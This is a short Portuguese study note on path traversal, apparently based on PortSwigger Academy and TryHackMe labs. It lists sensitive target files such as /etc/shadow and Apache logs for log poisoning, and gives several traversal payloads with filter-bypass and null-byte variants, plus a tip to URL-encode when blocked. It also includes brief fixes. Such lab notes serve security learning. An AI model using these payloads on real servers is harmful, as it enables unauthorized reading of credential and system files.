# Path Transversal
> Anotações com base no laboratórios do Portswigger Academy e TryHackMe

A vulnerabilidade de **Path Transversal** ou **Directory Transversal**, mas também conhecida com _dot-dot-slash_, refere-se a visualização não autorizada de arquivos com informações sensíveis para o compromentimento da máquina.

``/etc/passwd`` - Usuários presentes no sistema

``/etc/shadow`` - Hashes das senhas presentes no sistema

``/var/log/apache2/acess.log`` ou ``/var/log/httpd/access_log``- Para envenanmento log

## Exemplos
``http://example.com/get-files?file=report.pdf``

``http://example.com/get-php?f=list``

## Paylods básicos
``../../../../etc/passwd``

``....//....//....//....//etc/passwd``

``....\/....\/....\/....\/etc/passwd``

``/var/www/html/../../../../etc/passwd``

``../../../../../../../../etc/passd%00``

## Observações
No Windows, pode-se apenas explorar o diretório de web.

No GNU/Linux, pode-se visualizar todo o disco.

## Correções
- Validar a entrada do usuário ao checar o arquivo final.
- Bloquear os acessos as outras pastas.

## Extras
Caminho relativo: Refere-se ao caminho da pasta atual (./folder/file.php)

Caminho absoluto: Refere-se ao caminho completo (/var/www/html/folder/file.php)

Em caso de bloqueio por parte das aplicações, recorrer a ofuscação com URL Code
